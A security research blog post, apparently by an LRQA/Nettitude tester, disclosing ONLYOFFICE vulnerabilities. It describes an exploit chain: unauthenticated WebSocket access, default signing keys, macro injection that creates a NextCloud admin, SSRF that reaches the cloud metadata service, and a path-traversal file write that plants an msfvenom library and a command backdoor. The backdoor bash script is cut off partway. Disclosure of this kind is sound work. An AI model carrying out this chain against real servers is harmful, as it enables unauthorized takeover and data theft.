=== Content from labs.nettitude.com_205178bc_20250108_134808.html ===


[Skip content](#content)

Global (English)

* [About us](/en/who-we-are/)
* [Client login](/en/client-portal/)
* [⚠️ Report a Cyber Incident](/en/emergency-incident-response-services/)
* [Contact us](/en/contact-us/)

[Logo](/en/)

Menu

Close

* Assurance 4.0

  + Back
  + [Assurance 4.0](/en/who-we-are/assurance-4/)
  + [Assure Assets and Management Systems](/en/assure-assets-and-management-systems/)
  + [Achieve Product Integrity](/en/achieve-product-integrity/)
  + [Source Responsibly](/en/source-responsibly/)
  + [Navigate the Energy Transition and Achieve Net Zero](/en/navigate-the-energy-transition-and-achieve-net-zero/)
  + [Strengthen Cyber Security Maturity](/en/strengthen-cybersecurity-maturity/)
* Sectors

  + Back
  + [Sectors](/en/sectors/)
  + [Food and Beverage](/en/food-beverage-hospitality/)
  + [Financial and Professional Services](/en/financial-and-professional-services/)
  + [Energy and Renewables](/en/energy-renewables/)
  + [Transportation and Mobility](/en/transport-logistics/)
  + [Technology and Telecommunications](/en/ict-telecoms/)
  + [Consumer Goods and Retail](/en/consumer-goods-and-retail/)
  + [Construction and Engineering](/en/construction-industry/)
  + [Healthcare and Medical](/en/healthcare-medical/)
  + [Can't see your sector?](/en/contact-us/)
* Services

  + Back
  + [Services](/en/services/)
  + Assessment and Certification

    - Back
    - [Assessment and Certification](/en/assessment-certification/)
    - [Transfer your Certification to LRQA](/en/transfer-certification-to-lrqa/)
    - Quality, Environment, Health and Safety

      * Back
      * [Quality, Environment, Health and Safety](/en/quality-health-and-safety-and-environmental/)
      * [ISO 9001 Certification](/en/iso-9001/)
      * [ISO 14001 Certification](/en/iso-14001/)
      * [ISO 45001 Certification](/en/iso-45001/)
    - Food and Beverage

      * Back
      * [Food and Beverage](/en/food-beverage-hospitality/)
      * [FSSC 22000 Certification](/en/fssc-22000/)
      * [BRCGS Certification](/en/brcgs-food-safety/)
      * [2nd Party Audits](/en/2nd-party-audit-programmes/)
      * [ISO 22000 Certification](/en/iso-22000/)
      * [IFS Certification](/en/ifs/)
      * [SQF Certification](/en/sqf-certification/)
      * [HACCP Certification](/en/haccp/)
      * [Food Labelling](/en/food-labelling-regulation-advisory-services/)
      * [GSA BAP Certification](/en/gsa-bap/)
      * [MSC Certification](/en/msc/)
      * [ASC Certification](/en/asc/)
    - Sustainability and Responsible Sourcing

      * Back
      * [Sustainability and Responsible Sourcing](/en/climate-change-sustainability/)
      * [ISO 14064 Certification](/en/iso-14064/)
      * [ISO 50001 Certification](/en/iso-50001/)
      * [ISO 46001 Certification](/en/iso-46001/)
      * [Sedex Members Ethical Trade Audit (SMETA)](/en/smeta/)
      * [Amfori BSCI](/en/amfori-bsci-business-social-compliance-initiative/)
      * [Farm First](/en/farm-first-assurance-scheme/)
      * [ERSA](/en/ersa-responsible-sourcing-assessment/)
      * [Social and Labour Convergence Programme (SLCP)](/en/social-labour-convergence-program-slcp/)
      * [Initiative for Compliance and Sustainability (ICS)](/en/initiative-for-compliance-and-sustainability/)
      * [Responsible Business Alliance - Validated Assessment Program (RBA-VAP)](/en/rba-vap-validated-assessment-program/)
      * [Worldwide Responsible Accredited Production (WRAP)](/en/worldwide-responsible-accredited-production/)
      * [EU ETS](/en/eu-ets/)
      * [Responsible Plastic Management](/en/responsible-plastic-management/)
    - Information Security Management

      * Back
      * [Information Security Management](/en/information-security-management/)
      * [ISO 27001 Certification](/en/iso-27001/)
      * [ISO 27701 Certification](/en/iso-27701/)
      * [ISO 20000-1 Certification](/en/iso-20000/)
      * [ISO 22301 Certification](/en/iso-22301/)
      * [CSA STAR Certification](/en/csa-star/)
      * [ISO 42001 Certification](/en/iso-42001-ai-management-system-certification/)
    - Automotive and Aerospace

      * Back
      * [Automotive and Aerospace](/en/automotive-aerospace/)
      * [IATF 16949 Certification](/en/iatf-16949/)
      * [AS 9100 Certification](/en/as9100/)
    - [Medical - ISO 13485 Certification](/en/iso-13485/)
    - [Oil and Gas - ISO 29001 Certification](/en/iso-29001/)
    - [Client-Specific Programmes](/en/client-specific-programmes/)
    - [LRQA Worker Surveys](/en/lrqa-worker-surveys/)
  + Inspection Services

    - Back
    - [Inspection Services](/en/inspection-services/)
    - Product, System and Process Certification

      * Back
      * [Product, System and Process Certification](/en/codes-standards-regulations/)
      * [ASME](/en/asme-code-services/)
      * [Pressure Equipment Directive (PED)](/en/pressure-equipment-directive/)
      * [National Approvals](/en/product-certification/national-approvals/)
      * [EU Directives](/en/product-certification/ce-marking-and-eu-directives/)
    - Welding and Material Services

      * Back
      * [Welding and Material Services](/en/materials-and-welding/)
      * [EN 10204 Type 3.2](/en/materials-and-welding/en-10204-type-3-2-certification-services/)
      * [ISO 3834 Certification](/en/materials-and-welding/iso-3834/)
      * [Welding Procedure and Welder Operator Qualification](/en/materials-and-welding/welding-operator-qualification/)
    - [Container Certification](/en/containers/)
    - [Type Approval](/en/product-certification/type-approval/)
    - [Utilities Schemes](/en/utilities/)
    - Construction Scheme

      * Back
      * [Construction Scheme](/en/construction-industry/)
      * [BIM and ISO 19650](/en/construction-industry/building-information-modelling-bim/)
      * [BOPAS](/en/construction-industry/buildoffsite-property-assurance-scheme-bopas/)
      * [Construction Products Regulation (CPR)](/en/construction-products-regulation/)
    - Energy Transition Services

      * Back
      * [Energy Transition Services](/en/energy-transition-services/)
      * [Hydrogen Projects](/en/hydrogen-net-zero-manufacturing/)
      * [Nuclear Projects](/en/nuclear-supply-chain-inspection/)
      * [Solar Projects](/en/solar-projects-assurance/)
      * [Wind Projects](/en/wind-projects-assurance/)
    - Technical Advisory

      * Back
      * Technical Advisory
      * [Additive Manufacturing](/en/additive-manufacturing/)
      * [Other Technical Advisory Services](/en/technical-advisory-services/)
    - Supply Chain and Vendor Inspection

      * Back
      * [Supply Chain and Vendor Inspection](/en/supply-chain-inspection/)
      * [Cranes and Lifting Equipment](/en/manufacturing-industry/cranes-lifting-equipment/)
    - [Remote Inspection](/en/remote-inspection/)
  + Cyber Security Services

    - Back
    - [Cyber Security Services](/en/cyber-security-services/)
    - [⚠️ Report a Cyber Incident](/en/emergency-incident-response-services/)
    - Cyber Advisory

      * Back
      * [Cyber Advisory](/en/cyber-security-advisory-services/)
      * [Threat Intelligence Services](/en/threat-intelligence-services/)
      * [Virtual CISO Services](/en/virtual-ciso/)
      * [ThreatWatcher](/en/threatwatcher/)
      * [Threat Modelling](/en/threat-modelling/)
      * [Regulatory Compliance Testing](/en/regulatory-compliance-testing/)
      * [Red Teaming](/en/red-teaming/)
      * [Purple Teaming](/en/purple-teaming/)
      * [Cyber Security Maturity Assessment](/en/cyber-security-maturity-assessment/)
      * [Merger and Aquisitions Due Diligence](/en/mergers-and-acquisition-due-diligence/)
      * [Offensive Cyber Security Training](/en/offensive-cyber-security-training/)
    - Governance, Risk and Compliance

      * Back
      * [Governance, Risk and Compliance](/en/governance-risk-compliance-services/)
      * [PCI DSS Consultancy and Assessments](/en/pci-dss-assessments/)
      * [Security Awareness Training](/en/security-awareness-training/)
      * [DORA Compliance](/en/dora-compliance/)
      * [ISO 27001 Certification](/en/iso-27001/)
      * [NIST Cyber Security Framework](/en/nist-cyber-security-framework/)
      * [NCSC 10 Steps to Cyber Security](/en/ncsc-ten-steps-to-cyber-security-assessment/)
      * [CAA ASSURE Cyber Audit](/en/caa-assure-cyber-audit/)
      * [Vendor Security Review](/en/vendor-security-review/)
      * [Policies Procedures Creation and Review](/en/policies-procedures-creation-review/)
      * [Cyber Essentials Certification](/en/cyber-essentials-certification/)
      * [Cyber Security Risk Assessment](/en/cyber-security-risk-assessment/)
      * [Cloud Security and Privacy](/en/information-security-management/)
      * [CMMC Compliance](/en/cmmc-compliance/)
    - Managed Cyber Security Services

      * Back
      * [Managed Cyber Security Services](/en/managed-security-services/)
      * [SOC-as-a-Service (SOCaaS)](/en/soc-as-a-service/)
      * [Network Detection and Response (NDR)](/en/network-detection-and-response/)
      * [Extended Detection and Response (XDR)](/en/extended-detection-and-response/)
      * [Managed Detection and Response (MDR)](/en/managed-detection-and-response/)
      * [Security Information and Event Management (SIEM)](/en/security-information-and-event-management-siem-services/)
      * [Endpoint Detection and Response (EDR)](/en/endpoint-detection-and-response/)
      * [Virtual CISO Services](/en/virtual-ciso/)
      * [Digital Forensics and Incident Response](/en/digital-forensics-and-incident-response/)
      * [Vulnerability Scanning](/en/managed-vulnerability-scanning/)
    - Incident Response

      * Back
      * [Incident Response](/en/incident-response-services/)
      * [Digital Forensics and Incident Response](/en/digital-forensics-and-incident-response/)
      * [Emergency Incident Response](/en/emergency-incident-response-services/)
    - Cyber Security Testing

      * Back
      * [Cyber Security Testing](/en/cyber-security-testing/)
      * [Penetration Testing Services](/en/penetration-testing/)
      * [Web Application Penetration Testing](/en/web-application-penetration-testing/)
      * [Mobile Application Penetration Testing](/en/mobile-application-penetration-testing/)
      * [Cloud Penetration Testing](/en/cloud-penetration-testing/)
      * [Continuous Assurance](/en/continuous-assurance/)
      * [Red Teaming](/en/red-teaming/)
      * [Purple Teaming](/en/purple-teaming/)
      * [Social Engineering](/en/social-engineering/)
      * [Bug Bounty Program](/en/bug-bounty-program/)
    - Cyber Insurance Services

      * Back
      * Cyber Insurance Services
      * [Cyber Insurance Partner](/en/cyber-insurance-service-partner/)
      * [Cyber Insurance](/en/cyber-insurance-services/)
  + Verification and Report Assurance

    - Back
    - [Verification and Report Assurance](/en/assurance-services/)
    - [CSRD](/en/csrd/)
    - [Organisational GHG and Carbon Verification](/en/organisational-ghg-carbon-verification/)
    - [Environmental and Social Verification](/en/environmental-social-verification/)
    - [Product Carbon Footprinting](/en/product-carbon-footprinting/)
    - [Carbon Neutrality](/en/carbon-neutrality/)
    - [Regulatory Emission Schemes](/en/regulatory-emission-schemes/)
    - [Sector Carbon Standards](/en/sector-carbon-standards/)
  + Training

    - Back
    - Training
    - All Training Courses

      * Back
      * [All Training Courses](/en/training/overview/)
      * [Quality, Environment, Health and Safety Training](/en/training/quality-environmental-health-and-safety/)
      * [Food, Beverage and Hospitality Training](/en/training/food-beverage-hospitality/)
      * [Medical Devices Training](/en/training/medical-devices/)
      * [Cybersecurity and Information Security Training](/en/training/infosecurity-cyber/)
      * [Climate Change and Sustainability Training](/en/training/climate-change-sustainability/)
      * [Automotive, Aerospace and Transport Training](/en/training/automotive-aerospace/)
      * [Manufacturing Codes and Standards Training](/en/training/manufacturing/)
    - Online Training

      * Back
      * [Online Training](/en/training/virtual-classroom-online-courses/)
      * [Virtual Classroom Courses](/en/training/virtual-classroom-courses/)
      * [eLearning](/en/training/elearning-courses/)
      * [Blended Training](/en/training/blended/)
    - [LRQA Training Academy](/en/training-academy/)
    - [Management System Solutions](/en/management-system-solutions/)
    - [Training Portal](https://training-portal.lrqa.com/lmt/clmsbrowsev2.prmain?site=lrqaext&in_lang=en&in_region=gl)
  + Advisory Services

    - Back
    - [Advisory Services](/en/advisory-services/)
    - [ESG Advisory](/en/esg-advisory/)
    - [CSDDD](/en/csddd/)
    - [CSRD](/en/csrd/)
    - Diagnostics

      * Back
      * [Diagnostics](/en/diagnostics/)
      * [Responsible Sourcing](/en/responsible-sourcing-in-supply-chains/)
      * [Human Rights Impact Assessment (HRIA)](/en/human-rights-impact-assessment/)
      * [Net Zero](/en/net-zero-climate-risk-service/)
      * [Double Materiality](/en/double-materiality-assessment/)
    - Strategy and Design

      * Back
      * [Strategy and Design](/en/strategy-and-design/)
      * [Supply Chain Risk Assessment and Segmentation](/en/supply-chain-risk-assessment-segmentation-service/)
      * [Carbon Footprint and Decarbonisation Strategy](/en/corporate-decarbonisation-strategy/)
      * [Safety Culture Ladder](/en/safety-culture-ladder/)
    - Implementation

      * Back
      * [Implementation](/en/implementation/)
      * [Grievance Mechanism](/en/grievance-mechanism/)
      * [GHG Inventory](/en/ghg-inventory-service/)
      * [Waste and Emissions Supply Chain Engagement](/en/waste-and-emissions-supply-chain-engagement/)
    - Reporting and Disclosure

      * Back
      * [Reporting and Disclosure](/en/reporting-and-disclosure/)
      * [Climate Disclosure](/en/climate-disclosure-service/)
      * [Sustainability Disclosure](/en/sustainability-disclosure/)
    - [Programme Management](/en/programme-management/)
    - [Technical Advisory](/en/technical-advisory-services/)
    - Training

      * Back
      * Training
      * [All Training Courses](/en/training/overview/)
      * [Online Training](/en/training/virtual-classroom-online-courses/)
      * [Management System Solutions](/en/management-system-solutions/)
      * [Training Portal](https://training-portal.lrqa.com/lmt/clmsbrowsev2.prmain?site=lrqaext&in_lang=en&in_region=gl)
    - [Management System Solutions](/en/management-system-solutions/)
    - [LRQA Worker Surveys](/en/lrqa-worker-surveys/)
  + Data and Analytics

    - Back
    - Data and Analytics
    - [LRQA's EiQ Platform](https://www.eiq.ai/)
    - [EiQ Lite](/en/eiq-lite/)
  + [Can't find the service you need?](/en/contact-us/)
* News and Insights

  + Back
  + News and Insights
  + [Latest News](/en/latest-news/)
  + [Thought Leadership Articles](/en/insights/articles/)
  + [Cyber Labs](/en/cyber-labs/)
  + [Case Studies](/en/case-studies/)
  + [Podcasts](/en/podcasts/)
  + [Downloadable Resources](/en/resources/)
  + [Legislation Map](/en/supply-chain-due-diligence-legislation-map/)
  + [Client Information Notes (CINs)](/en/resources/client-information-note/)
  + [Accreditations](/en/who-we-are/our-management-systems-accreditations/)
  + [Hall of fame](/nl-nl/case-studies/hall-of-fame/)
  + [Awards and Recognition](/en/who-we-are/awards-and-recognition/)
* [Events and Webinars](/en/events/)
* Careers

  + Back
  + [Careers](/en/careers/)
  + [What it's like to work here](/en/why-lrqa/)
  + [From application to onboarding](/en/career-faqs/)
  + Talent Community

    - Back
    - [Talent Community](/en/opportunities/)
    - [Assessment roles](/en/opportunities/assessment-roles/)
    - [Inspection Service roles](/en/opportunities/inspection-service-roles/)
    - [Cybersecurity roles](/en/opportunities/cybersecurity-roles/)
    - [Advisory and ESG roles](/en/opportunities/advisory-and-esg-roles/)
    - [Sales and Business Development roles](/en/opportunities/sales-roles/)
    - [Contractor roles](/en/opportunities/contractor-roles/)
    - [Corporate Function roles](/en/opportunities/corporate-function-roles/)
  + Apply now

    - Back
    - Apply now
    - [Advisory and ESG roles](https://elevatelimited.bamboohr.com/careers)
    - [All other roles](https://jobs.lrqa.com/)
* [About us](/en/who-we-are/)
* [Client login](/en/client-portal/)
* [⚠️ Report a Cyber Incident](/en/emergency-incident-response-services/)

Search

Close

Search form
Search open

Search

Are you looking for?

* [Events](/en/events/)
* [News](/en/latest-news/)
* [Case studies](/en/case-studies/)
* [Resource library](/en/resources/)
* [Client Portal](/en/client-portal/)
* [Client Information Notes](/en/resources/client-information-note/)

You are here:

1. [Home](/en/)
2. [Cyber Labs

   Back to previous page](/en/cyber-labs/)
3. **CVE-2021-43444 to 43449: Exploiting ONLYOFFICE Web Sockets for Unauthenticated Remote Code Execution**

![](/static/assets/search-grey.svg)
![LRQA Cyber Labs](/cdn-cgi/image/width=1024,format=auto/globalassets/cyber-labs/lrqa-cyber-labs.jpg)

# CVE-2021-43444 to 43449: Exploiting ONLYOFFICE Web Sockets for Unauthenticated Remote Code Execution

Iain Wallace

14 Dec 2022

## Download PwnlyOffice

![github](https://i0.wp.com/labs.nettitude.com/wp-content/uploads/2016/06/github-e1466539795501.png?resize=35%2C35&ssl=1)

## Background

About 18 months ago, I was conducting a pentest of a document management platform. It was designed with the goal of providing a secure document storage and sharing solution for some high impact use cases. In order to allow document editing similar to MS Office, the system was using ONLYOFFICE as a plugin, resulting in a slick and reliable editing experience.

I was curious though. For a web application that apparently did encryption at rest, at what point in the system does a blob of encrypted document become unencrypted and rendered in the browser? I decided to dig into the editor itself and work out what it was doing in the background. It turned out that the client side web application was requesting data from the web application in an internal format that client side code could parse into the document editor. I couldn’t readily open that data in any offline document editor but it didn’t appear to be encrypted, judging by the distinctly non-random series of characters that it featured.

![Internal OnlyOffice document data](/globalassets/cyber-labs/cve-2021-43444-to-43449-exploiting-onlyoffice-web-sockets-for-unauthenticated-remote-code-execution/graphical-user-interface-text-application-email.png?epslanguage=en)

So it seems that although this document manager was encrypting at rest, the keys to decrypt and process those documents were probably being passed around between the various components in order to handle those documents in the back end. Whilst problematic for the security of the document management system, I wanted to go deeper into the OnlyOffice component. Could this be exploited further?

The URLs for downloading this internal editor data were signed with MD5. This means that at some point, the application has to provide the user agent with that URL in order to download it. Testing session controls found that URL signing was the only access control implemented. This meant that if that URL was known, anyone could download the unencrypted document.

The URL was being provided through a WebSocket connection that the editor creates and maintains throughout the document editing process. I kept following the authentication flow back. How does the browser authenticate with that WebSocket? Usually when an application makes a WebSocket connection to the web server, it first makes an authenticated HTTP request to a known WebSocket endpoint and requests an upgrade (as per [RFC 6455](https://www.rfc-editor.org/rfc/rfc6455#page-6)). If the authentication is valid, the web server responds with a `HTTP 101 Switching Protocols` response message, e.g.

**Request:**

GET /websocket HTTP/1.1

Host: localhost

User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36

Accept: \*/\*

Accept-Language: en-GB,en;q=0.5

Accept-Encoding: gzip, deflate

Sec-WebSocket-Version: 13

Origin: http://localhost

Sec-WebSocket-Key: L9so59gHCxrpsnU4SPOsbw==

Connection: keep-alive, Upgrade

Cookie: sessionid=4795fab306588141e027f642b63debfb

Pragma: no-cache

Cache-Control: no-cache

Upgrade: websocket

**Response:**

HTTP/1.1 101 Switching Protocols

Server: nginx/1.21.3

Date: Fri, 07 Jan 2022 17:32:04 GMT

Connection: upgrade

Upgrade: websocket

Sec-WebSocket-Accept: uKmC7JGNT7wAZhZFtiSO5nvf1A8=

By experimenting with the various headers in the opening request, I found that the web server was happy to upgrade any incoming upgrade request, regardless of whether it had a session cookie or not – i.e. the OnlyOffice WebSocket was completely unauthenticated.

Can we exploit that though? What other pieces of information do we need in order to download a document? Again, experimenting with the client’s upgrade request, and various components of the WebSocket endpoint, it transpired that only the document identifier was required. The exploitability of this issue would entirely depend on how OnlyOffice was implemented. The document id might be a guarded secret, or it might leak in something as simple as a `referer` header. I looked for a way of weaponising this.

Elsewhere in the system I had identified a method of reflecting a cross site scripting payload. This could be used to scrape the contents of various document listings pages in the context of an authenticated user and send the document names and identifiers back to a malicious server. All that an attacker would need to do at this point is select an interesting document name and connect directly to the WebSocket endpoint for that document to download the document data which was referenced in the signed URLs that the WebSocket replied with.

![Proof of concept script connecting to the WebSocket](/globalassets/cyber-labs/cve-2021-43444-to-43449-exploiting-onlyoffice-web-sockets-for-unauthenticated-remote-code-execution/text-description-automatically-generated.png?epslanguage=en)

![Downloading unencrypted document data](/globalassets/cyber-labs/cve-2021-43444-to-43449-exploiting-onlyoffice-web-sockets-for-unauthenticated-remote-code-execution/text-description-automatically-generated-1.png?epslanguage=en)

In terms of that pentest, this was quite satisfactory to make a judgement on the security posture of the overall system and was all that could be investigated within the timeframe available. OnlyOffice had piqued my interest though. I decided to pull at the thread a bit more and see if this was an implementation issue or something a bit more widespread.

## Pulling at the Thread

With the original document management application now out of scope, I needed another testbed which used OnlyOffice as an editing module underneath its own authentication model. I quickly found a Docker compose configuration created by OnlyOffice to implement OnlyOffice as the editor for the Nextcloud document management system. With a few tweaks to the original `downloaddoc.py` script, I was able to extract documents from Nextcloud through OnlyOffice. What else can you do through the WebSocket endpoint?

I explored the functionality of the document editor and found that basically all actions that are performed against the document are done through a WebSocket message, even down to the position of the cursor on the page. I looked for a few interesting features and found that OnlyOffice document editor features its own built-in chat client so that you can chat with people while working on the document that you’re all looking at. That is very cool, but if we can connect to the WebSocket unauthenticated, how does it know what name to display in the chat message? It’s simple, it’s taken from the first message sent to the WebSocket, type “auth”.

![Connecting as admin](/globalassets/cyber-labs/cve-2021-43444-to-43449-exploiting-onlyoffice-web-sockets-for-unauthenticated-remote-code-execution/word-image-15602-4.png?epslanguage=en)

Change that value when you connect and any actions thereafter are done in whatever name you selected. I decided at this point it was worth taking the logic in `downloaddoc.py` and put it into a general OnlyOffice exploit tool. Imaginatively I called this tool `pwnlyoffice`.

![github](https://i0.wp.com/labs.nettitude.com/wp-content/uploads/2016/06/github-e1466539795501.png?resize=35%2C35&ssl=1) **GitHub:** <https://github.com/nettitude/pwnlyoffice>

Let’s see how the “chat” command in `pwnlyoffice` looks when used against a known document id with someone already editing it…

![Interacting with document chat functions](/globalassets/cyber-labs/cve-2021-43444-to-43449-exploiting-onlyoffice-web-sockets-for-unauthenticated-remote-code-execution/text-description-automatically-generated-2.png?epslanguage=en)

and in the UI…

![Apparently legitimate chat message](/globalassets/cyber-labs/cve-2021-43444-to-43449-exploiting-onlyoffice-web-sockets-for-unauthenticated-remote-code-execution/graphical-user-interface-application-description.png?epslanguage=en)

OnlyOffice does feature protections against this kind of unauthenticated connection to its WebSocket endpoints, but they are not enabled by default. JWT signing is possible, however, also by default the signing key is the word “secret”. This means that even if JWT signing is enabled, unless the default key is changed, it is still trivial to connect to the WebSocket unauthenticated. I looked at where else cryptographic signing might rely on a weak default key and indeed the MD5 signed URL which the editor downloads from is signed using the default string “verysecretstring”. This means that with a known document id I could download directly from the server without even needing to connect to the WebSocket.

## Escalating Privileges

This is all good fun, but when we’re targeting an organisation we’re usually looking for more of a foothold than simply social engineering them. What we need is a method of pivoting out of the OnlyOffice document editor and into the wider document management service (in this instance, NextCloud). NextCloud modules are deployed in the same origin as NextCloud itself, so hopefully a nice breakout method would involve finding cross site scripting in OnlyOffice which could be executed against NextCloud. I didn’t have to look far.

OnlyOffice document editor is full featured. It is squarely aimed at being a replacement for MS Office products and it does this very well. So well in fact that even some of the features that I would have thought best left in MS Office have also found their way into OnlyOffice, particularly macros. Unlike MS Office however, OnlyOffice doesn’t attempt to include a VBA parser for backwards compatibility. OnlyOffice macros are implemented in JavaScript, as can be seen by the stub function that is created when you open the macro editor.

![Macro editor](/globalassets/cyber-labs/cve-2021-43444-to-43449-exploiting-onlyoffice-web-sockets-for-unauthenticated-remote-code-execution/graphical-user-interface-application-word-descr.png?epslanguage=en)

Great, so now we’re probably looking for some kind of sandbox escape that can get us out into arbitrary JS execution in the scope of NextCloud, right? No, this is the code for executing a macro:

CDocumentMacros.prototype.run = function(sGuid)

{

 try

 {

 var obj = JSON.parse(this.Data);

 if (!obj["macrosArray"])

 return;

 for (var i = 0; i < obj["macrosArray"].length; i++)

 {

 if (sGuid === obj["macrosArray"][i]["guid"])

 {

 var script = "(function(){ var Api = window.g\_asc\_plugins.api;\n" + obj["macrosArray"][i]["value"] + "\n})();";

 eval(script);

 break;

 }

 }

 }

 catch (err)

 {

 }

};

Yes, just `eval()` the macro in the browser, and because all actions against a document are done through the WebSocket, if we know a document id we can just inject some JavaScript right into that document to automatically run if someone opens it. After figuring out how macros were encoded, I added this functionality to `pwnlyoffice`:

![Injecting a macro into a known document id](/globalassets/cyber-labs/cve-2021-43444-to-43449-exploiting-onlyoffice-web-sockets-for-unauthenticated-remote-code-execution/word-image-15602-8.png?epslanguage=en)

And after loading the document:

![Alert box generated](/globalassets/cyber-labs/cve-2021-43444-to-43449-exploiting-onlyoffice-web-sockets-for-unauthenticated-remote-code-execution/graphical-user-interface-application-description-1.png?epslanguage=en)

So that works. Let’s use it to get admin on NextCloud. In NextCloud you have to confirm your password to perform admin actions, however the HTTP request to confirm your password is actually separate from the admin action you’re confirming, and is only required if you haven’t confirmed your password in the last 30 minutes. So if you’re scripting a malicious admin action as I am, you can avoid this step and invisibly create an admin in the background by posting to the relevant URL. One extra step is required to get a CSRF token before the create step.

![Creating an admin via a macro](/globalassets/cyber-labs/cve-2021-43444-to-43449-exploiting-onlyoffice-web-sockets-for-unauthenticated-remote-code-execution/graphical-user-interface-text-application-descr.png?epslanguage=en)

and in the user management area, our admin is created for us:

## Admin created

## Exploiting the Document Converter

Now we’re getting somewhere, if we know a document id it is feasible that we can poison a document and then get admin on a target’s document management system. We still have to know a document id though, and these tend to be pretty hard to guess. What else will the WebSocket let us do? I noticed that when you connect to the WebSocket in a normal connection, the document server is provided a signed URL for the location of the original document. What can we do with that?

![The URL of the original document](/globalassets/cyber-labs/cve-2021-43444-to-43449-exploiting-onlyoffice-web-sockets-for-unauthenticated-remote-code-execution/text-description-automatically-generated-3.png?epslanguage=en)

As you might expect, this calls out to, downloads and then converts any URL you give it. So with my early experiments against Burp Collaborator, my document server was quickly filling up with documents containing the single random string that my collaborator URL was providing. It wasn’t just handling document formats, the converter inside OnlyOffice could understand and convert between a wide variety of document formats. We therefore have a server side request forgery method that can GET any internal URL and render the contents for us in any format. Targeting an OnlyOffice instance in the cloud? Try hitting the `http://169.254.169.254` meta-data service for some credentials and see if you can do some lateral movement! Scan around the internal network of an on-prem hosted instance and see if there are any unauthenticated wikis floating about. SSRF changes the scope a great deal.

Being able to convert any URL we like doesn’t just mean being able to access previously unavailable resources, it also means that we can force the server to download from our own resources. Is it possible to create a document in some format that could be malicious to the server?

Typical weaknesses when dealing with document parsing are:

1. XXE in parsing internal MS Office XML
2. Path traversal (“Zip slip”) in extracting MS Office data
3. SSRF in rendering HTML to PDF or image

I followed the source code of the document converter to understand how it treated various formats and, having spent a lot of time determining that a path traversal vulnerability was present in the MS Office format parts of the code, I discovered that this was already discovered in 2020.

> An issue was discovered in ONLYOFFICE Document Server 5.5.0. An attacker can craft a malicious .docx file, and exploit the unzip function to rewrite a binary and remotely execute code on a victim’s server.

## Arbitrary File Write

Always do a bit of research first! Surprisingly, it doesn’t look like there was much of an attempt to correct this vulnerability. It’s a fairly classic path traversal flaw at its core. MS Office formats (after 2007) are simply zip files with a standard file structure containing XML files and anything else that is embedded such as images. The document converter used by OnlyOffice converts an MS Office file and extracts it to a temporary location, writing any files within it out to a location relative to that temp directory. After the conversion is complete, the temporary directory is deleted, but crucially if a file within the zip has path traversal characters (`../`), these can be used to write to any location on the document server which is writable by the web server.

I tested this out by taking a legitimate DOCX file and adding to it a small file with the path `../../../../../../../../../../tmp/test`. I hosted this on a local webserver and then prompted the document server to download it via the unauthenticated WebSocket. Sure enough, jumping into the Docker container running the document server, there was the file test, sitting in `/tmp/`.

## Exploiting for Code Execution

Now to exploit this. I thought quite a nice way of exploiting remote code execution would be to backdoor the document converter tool so that all of the command and control traffic could simply just flow over the same WebSocket channel that we were already using. This included the added bonus that it did not appear that WebSocket messages were being logged. I looked into the document converter, and the binary central to it all, called `x2t`. For some reason it wasn’t possible to overwrite `x2t` itself during document conversion, so inside the Docker container for the document server I enumerated the dynamic libraries that `x2t` used or, more specifically, which binaries it was searching for and not finding in locations that I could write to using the path traversal vulnerability:

strace ./x2t 2>&1 | grep "No such" | grep -o "[^ ]\+\.so"

"/var/www/onlyoffice/documentserver/server/FileConverter/bin/tls/haswell/x86\_64/libgraphics.so

"/var/www/onlyoffice/documentserver/server/FileConverter/bin/tls/haswell/libgraphics.so

"/var/www/onlyoffice/documentserver/server/FileConverter/bin/tls/x86\_64/libgraphics.so

"/var/www/onlyoffice/documentserver/server/FileConverter/bin/tls/libgraphics.so

"/var/www/onlyoffice/documentserver/server/FileConverter/bin/haswell/x86\_64/libgraphics.so

"/var/www/onlyoffice/documentserver/server/FileConverter/bin/haswell/libgraphics.so

"/var/www/onlyoffice/documentserver/server/FileConverter/bin/x86\_64/libgraphics.so

\*"/var/www/onlyoffice/documentserver/server/FileConverter/bin/libpthread.so

"/var/www/onlyoffice/documentserver/server/FileConverter/bin/system/tls/haswell/x86\_64/libpthread.so

"/var/www/onlyoffice/documentserver/server/FileConverter/bin/system/tls/haswell/libpthread.so

"/var/www/onlyoffice/documentserver/server/FileConverter/bin/system/tls/x86\_64/libpthread.so

"/var/www/onlyoffice/documentserver/server/FileConverter/bin/system/tls/libpthread.so

"/var/www/onlyoffice/documentserver/server/FileConverter/bin/system/haswell/x86\_64/libpthread.so

"/var/www/onlyoffice/documentserver/server/FileConverter/bin/system/haswell/libpthread.so

"/var/www/onlyoffice/documentserver/server/FileConverter/bin/system/x86\_64/libpthread.so

"/var/www/onlyoffice/documentserver/server/FileConverter/bin/system/libpthread.so

"/var/www/onlyoffice/documentserver/server/FileConverter/bin/libm.so

"/var/www/onlyoffice/documentserver/server/FileConverter/bin/libc.so

"/var/www/onlyoffice/documentserver/server/FileConverter/bin/libgcc\_s.so

"/var/www/onlyoffice/documentserver/server/FileConverter/bin/libdl.so

"/var/www/onlyoffice/documentserver/server/FileConverter/bin/libdl.so

"/var/www/onlyoffice/documentserver/server/FileConverter/bin/libstdc++.so

"/var/www/onlyoffice/documentserver/server/FileConverter/bin/libstdc++.so

Fortunately, the `FileConverter/bin` directory was writable by the web service user. I selected `libpthread.so` as a file to create and used MSF Venom to create a simple `.so` payload which copied a script over `x2t`. This was packaged along with the backdoor script (and a backup version of `x2t` just to not completely break the server in case anything goes wrong).

![Structure of the backdoor docx](/globalassets/cyber-labs/cve-2021-43444-to-43449-exploiting-onlyoffice-web-sockets-for-unauthenticated-remote-code-execution/text-description-automatically-generated-4.png?epslanguage=en)

The backdoor script itself takes the title parameter from the document conversion task, checks to see if it has the right password and then executes the rest of the string as a bash command. The output of the command is then swapped into the input for the document conversion job so that if we were to download the signed URL which is generated after the conversion job, it would contain the output of our command.

I realised an SQL shell would also be kind of handy for listing out document ids, so I added that in as well.

#!/usr/bin/env bash

# Overwritten for a binary then calls the original binary

# Get title

title=$(grep -o "<m\_sTitle>.\*</m\_sTitle>" $1 | cut -d\> -f 2- | rev | cut -d \< -f 2- | rev | sed 's/&nbsp;/ /g; s/&amp;/\&/g; s/&lt;/\</g; s/&gt;/\>/g; s/&quot;/\"/g; s/#&#39;/\'"'"'/g; s/&ldquo;/\"/g; s/&rdquo;/\"/g;')

# Get tmp input file path

